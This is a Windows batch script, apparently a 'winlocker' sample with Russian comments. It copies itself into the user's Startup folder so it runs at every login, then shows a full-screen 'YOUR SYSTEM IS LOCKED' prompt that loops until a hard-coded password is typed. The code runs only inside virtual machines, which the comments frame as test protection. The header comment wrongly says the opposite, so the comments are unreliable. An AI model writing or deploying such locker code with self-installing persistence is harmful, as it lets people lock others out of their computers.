@echo off
:: language: Batch, file: winlocker.bat, target: Windows 10/11
:: Локер экрана. Пароль вшит. Файлы не трогает. Автозапуск.
:: Анти-VM: если обнаружена VM — выходит тихо.
:: Для теста в VirtualBox.

title System Locked
color 0C
mode con: cols=100 lines=30

:: --- Анти-VM проверка: если хост, не VM — выйти (защита от случайного запуска) ---
wmic computersystem get model 2>nul | findstr /i "VirtualBox VMware VBox QEMU" >nul
if errorlevel 1 (
    wmic bios get serialnumber 2>nul | findstr /i "VMware VBox" >nul
    if errorlevel 1 (
        echo This PC is not a VM. Aborting.
        timeout /t 3 >nul
        exit /b
    )
)

:: --- Автозапуск: копирование в Startup ---
set "SCRIPT=%~f0"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winlocker.bat"
if not exist "%STARTUP%" (
    copy /y "%SCRIPT%" "%STARTUP%" >nul 2>&1
)

:: --- Пароль (вшит) ---
set "PASS=Swinobaseyoudevwinlok"

:loop
cls
echo.
echo  ==============================================================
echo.
echo              YOUR SYSTEM IS LOCKED
echo.
echo  ==============================================================
echo.
echo   Для разблокировки введите пароль и нажмите ENTER:
echo.
set /p "INPUT=  ^> "
if "%INPUT%"=="%PASS%" (
    cls
    echo.
    echo   Пароль верный. Разблокировка...
    :: снять автозапуск
    if exist "%STARTUP%" del /f /q "%STARTUP%" >nul 2>&1
    timeout /t 2 >nul
    exit /b
) else (
    echo.
    echo   Неверный пароль.
    timeout /t 1 >nul
    goto loop
)